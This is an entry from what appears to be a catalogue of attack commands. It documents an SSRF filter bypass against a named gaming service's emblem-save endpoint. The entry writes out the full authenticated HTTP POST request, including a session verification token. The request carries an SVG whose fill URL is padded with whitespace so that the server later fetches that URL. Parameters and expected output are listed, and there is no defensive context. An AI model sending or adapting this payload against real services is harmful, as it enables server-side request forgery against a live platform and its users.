---
id: cmd-uuid-002
data: >-
  POST https://socialclub.rockstargames.com/emblems/save HTTP/1.1 ...
  {"emblemId": "4YldoM0O", "hash": "32fd3fd9a0f04b6cd5048594c9d266a9acf1aa38",
  "svgData": "<svg ... fill=\"url( http://example/te st#123 )\" ...>", ...}
tags:
  - ssrf
  - bypass
type: command
output: null
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.308Z'
verified: false
validated: true
submitted: true
---
# post-emblems-save-bypass

## Command

```http
POST https://socialclub.rockstargames.com/emblems/save HTTP/1.1
Host: socialclub.rockstargames.com
Content-Type: application/json
RequestVerificationToken: h6O-_HDNgAKKDe-jDxZBRZsKz3rmcXAQw48fJVVAOTdR_VR6hRTLSsu-My5CDJ6zmeXkLAtsCKap3WbMtm7z5kEH7WY1
{"emblemId": "4YldoM0O", "hash": "32fd3fd9a0f04b6cd5048594c9d266a9acf1aa38", "svgData": "base64-encoded SVG with fill=\"url( http://example/te st#123 )\" "}
```

## Description

Submits a malformed SVG with whitespace in the URL to bypass SSRF filtering when saving an emblem.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| svgData | Base64-encoded SVG with malformed URL | Yes |
| Content-Type | application/json | Yes |
| RequestVerificationToken | Auth token from session | Yes |

## Examples

### Basic Usage

```http
POST /emblems/save ... {"svgData": "..."}
```

### Advanced Usage

Include full headers for authenticated session.

## Expected Output

HTTP 200; emblem saved. Upon publish, server requests /te%20st.

## Related

- [[procedures/Bypass-SSRF-Fix-Using-Whitespace-in-URL]]
